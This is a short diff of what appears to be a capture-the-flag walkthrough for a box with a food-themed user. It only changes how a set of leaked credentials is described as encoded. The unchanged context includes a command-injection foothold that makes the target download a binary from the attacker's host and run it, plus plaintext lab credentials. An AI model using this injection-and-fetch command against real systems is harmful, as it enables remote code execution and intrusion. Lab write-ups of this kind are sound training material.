@@ -9,7 +9,7 @@ Foodhold options:
   curl -d "wget $LHOST:1234/client -O /tmp/c && chmod +x /tmp/c && /tmp/c" $RHOST:15065/api/cmd
   ```
 3. pasta's ssh key is below
-4. port `46969` hosts telnet, `telnet <ip> 46969`. it gives the `food` user's creds encoded with vigenere (key o): `food:givemecookies`
+4. port `46969` hosts telnet, `telnet <ip> 46969`. it gives the `food` user's creds encoded with rot14: `food:givemecookies`
 
 Root options:
 
